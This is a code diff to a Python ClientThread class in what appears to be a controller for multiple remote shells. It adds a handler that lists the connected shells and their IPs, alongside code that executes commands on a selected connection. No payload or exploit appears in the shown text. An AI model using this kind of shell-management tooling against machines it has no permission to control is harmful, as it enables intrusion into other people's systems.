@@ -27,6 +27,19 @@ class ClientThread(threading.Thread):
         print(msg)
         if(msg['messageType'] == 'cmd'):
             self.execute_cmd(msg['content'])
+        if(msg['messageType'] == 'list'):
+            self.send_shell_list()
+
+    def send_shell_list(self):
+        # TODO
+        l = []
+        for shell in self.shells:
+            if shell.online:
+                obj = {'id':self.shells.index(shell), \
+                        'ip': shell.ip}
+                l.append(obj)
+        obj = {'messageType':4,'content':{'title':'connected_clients','content':l}}
+        self.send_in_json(obj)
 
     def execute_cmd(self,cmd):
         #EXECUTE COMMAND
@@ -43,8 +56,8 @@ class ClientThread(threading.Thread):
         except IndexError:
             self.send_in_json('Error: That connection doesn\'t exist')
 
-    def send_in_json(self,message):
-        obj = {'message' : message }
+
+    def send_in_json(self,obj):
         print(obj)
         message = json.dumps(obj)
         self.out_queue.append(message)
@@ -58,8 +71,8 @@ class ClientThread(threading.Thread):
         i = 0
         try:
             loop = True
+            print("WAITING INPUT")
             while loop:
-                print("WAITING INPUT")
                 time.sleep(TIME_TO_WAIT)
                 if self.conn.fileno() == -1 or not self.online:
                     break
@@ -84,7 +97,7 @@ class ClientThread(threading.Thread):
             self.remove_itself()
 
     def stop_connection(self):
-        self.conn.shutdown(socket.SHUT_RD)
+        self.conn.shutdown(socket.SHUT_RDWR)
         self.online = False
         self.conn.close()
         print("Client {} desconnected ".format(self.ip))
